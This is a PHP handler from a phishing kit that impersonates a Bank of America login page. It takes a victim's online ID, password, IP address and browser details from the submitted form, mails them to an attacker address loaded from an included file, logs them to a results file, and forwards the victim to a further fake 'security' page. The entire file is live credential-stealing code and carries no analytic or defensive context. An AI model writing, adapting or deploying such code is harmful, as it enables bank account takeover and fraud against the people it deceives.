<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include('../email.php');
include './bt.php';
include "./blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  LOGIN Boa  -------------\n";
$message .= "Onlineid : ".$_POST['onlineId']."\n";
$message .= "Password : ".$_POST['passcode']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Dr.Don----------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $subject);
mail(','.$form,$subject,$message,$headers);

header("Location: security.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>